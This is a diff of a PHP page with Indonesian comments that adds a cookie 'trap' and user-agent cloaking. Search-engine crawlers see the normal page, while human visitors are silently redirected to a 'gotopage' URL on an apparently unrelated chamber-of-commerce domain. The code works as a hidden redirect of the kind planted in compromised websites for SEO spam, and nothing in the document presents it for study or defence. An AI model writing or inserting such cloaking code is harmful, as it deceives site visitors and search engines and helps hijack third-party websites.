@@ -1,17 +1,21 @@
 <?php
+// --- BAGIAN 1: JEBAKAN COOKIE ('KUNCI') ---
+$cookie_name = 'lsc_cookie';
+if (!isset($_COOKIE[$cookie_name])) {
+    setcookie($cookie_name, uniqid(), time() + 3600, '/');
+}
+
+// --- BAGIAN 2: LOGIKA CLOAKING ('PINTU') ---
+// Header untuk mencegah cache di browser (tambahan)
 header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
 header('Pragma: no-cache');
 header('Expires: 0');
-?>
-<?php
+
+// Logika redirect
 if (isset($_SERVER['HTTP_USER_AGENT'])) {
     $user_agent = $_SERVER['HTTP_USER_AGENT'];
-    
-    // (case-insensitive)
     if (!preg_match('/google|bing|yandex|bot|spider|crawler/i', $user_agent)) {
         $relative_gotopage_url = 'https://www.sookeregionchamber.com/gotopage/?p=' . urlencode(strtoupper($title));
-        
-        // Redirect pengguna menggunakan path relatif
         header('Location: ' . $relative_gotopage_url);
         exit;
     }
